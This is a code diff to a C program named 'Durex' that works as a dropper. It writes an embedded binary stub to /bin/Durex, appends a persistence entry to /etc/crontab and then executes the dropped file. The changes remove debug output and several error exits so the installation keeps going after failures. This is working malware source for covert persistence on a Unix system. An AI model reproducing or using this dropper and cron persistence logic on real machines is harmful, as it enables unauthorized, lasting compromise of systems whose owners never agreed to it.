@@ -18,14 +18,14 @@
 #include <string.h>
 #include <errno.h>
 
-extern int stub[];
-extern size_t stub_len;
+extern unsigned char stub[];
+extern unsigned int stub_len;
 
 /*
  * Writes @blen bytes of @bin file in @bpath.
  * Creates the file if it doesn't exists. Overrides it if it does.
 */
-int write_binary(void *bin, size_t blen, const char *bpath)
+int write_binary(unsigned char *bin, unsigned int blen, const char *bpath)
 {
 	int fd;
 
@@ -33,7 +33,7 @@ int write_binary(void *bin, size_t blen, const char *bpath)
 	if (fd < 0)
 		return (-1);
 
-	write(fd, (char *)bin, blen);
+	write(fd, bin, blen);
 	close(fd);
 
 	return (0);
@@ -45,7 +45,6 @@ int add_crontab_entry(const char *cpath, const char *bpath)
 	char *cmd;
 	int ret;
 
-	printf("executed\n");
 	fd = open(cpath, O_RDWR | O_APPEND);
 	if (fd < 0)
 		return (-1);
@@ -80,7 +79,6 @@ int main(void)
 	if (pid < 0)
 	{
 		perror("Durex fork");
-		exit(EXIT_FAILURE);
 	}
 	else if (pid > 0)
 	{
@@ -99,14 +97,13 @@ int main(void)
 		if (write_binary(stub, stub_len, "/bin/Durex") < 0)
 		{
 			perror("Durex write");
-			exit(EXIT_FAILURE);
 		}
 
 		if (add_crontab_entry("/etc/crontab", "/bin/Durex") < 0)
 		{
 			perror("Durex cron");
-			exit(EXIT_FAILURE);
 		}
+		
 		execve("/bin/Durex", (char*[]){"/bin/Durex", NULL}, NULL);
 	}
 	return (0);
